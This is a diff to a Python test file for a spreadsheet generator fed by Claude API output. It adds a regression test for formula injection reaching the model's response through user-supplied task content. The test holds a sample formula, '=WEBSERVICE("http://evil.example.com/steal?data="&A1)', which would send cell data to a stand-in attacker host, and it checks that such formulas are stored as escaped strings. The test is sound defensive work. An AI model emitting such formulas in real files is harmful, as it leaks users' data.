@@ -68,6 +68,28 @@ def test_build_xlsx_bytes_preserves_formula_strings():
     raw = build_xlsx_bytes(spec)
     workbook = openpyxl.load_workbook(io.BytesIO(raw))
     assert workbook["S"]["A2"].value == "=SUM(A1:A1)"
+    assert workbook["S"]["A2"].data_type == "f"
+
+
+def test_build_xlsx_bytes_neutralizes_non_allowlisted_formulas():
+    """Claudeの応答(=課題内容というユーザー入力を経由した間接的な攻撃)に紛れ込んだ
+    数式インジェクションを防ぐ回帰テスト。SUM/AVERAGE等の単純な集計以外の"="始まり文字列は、
+    実際のExcel数式としてではなく、先頭に"'"を付けた無害な文字列として書き込まれる。
+    """
+    dangerous = '=WEBSERVICE("http://evil.example.com/steal?data="&A1)'
+    spec = {"sheets": [{"name": "S", "headers": [dangerous], "rows": [[dangerous, "普通のテキスト"]]}]}
+    raw = build_xlsx_bytes(spec)
+    workbook = openpyxl.load_workbook(io.BytesIO(raw))
+
+    header_cell = workbook["S"]["A1"]
+    row_cell = workbook["S"]["A2"]
+    untouched_cell = workbook["S"]["B2"]
+
+    assert header_cell.data_type == "s"  # "f"(数式)ではなく文字列として保存される
+    assert header_cell.value == "'" + dangerous
+    assert row_cell.data_type == "s"
+    assert row_cell.value == "'" + dangerous
+    assert untouched_cell.value == "普通のテキスト"  # "="始まりでない値は無変更
 
 
 # --- generate_task_text / generate_task_spreadsheet(実際にClaude APIを呼ぶ) ---
@@ -89,11 +111,11 @@ def test_generate_task_spreadsheet_returns_expected_shape():
 
 # --- POST /task-generator ---
 
-def _fake_task_text(description):
+def _fake_task_text(description, lang="ja"):
     return {"content": f"# 回答\n\n{description}についての内容です。", "_token_usage": {"input_tokens": 10, "output_tokens": 20}}
 
 
-def _fake_task_spreadsheet(description):
+def _fake_task_spreadsheet(description, lang="ja"):
     return {
         "spec": {
             "filename": "生成結果",
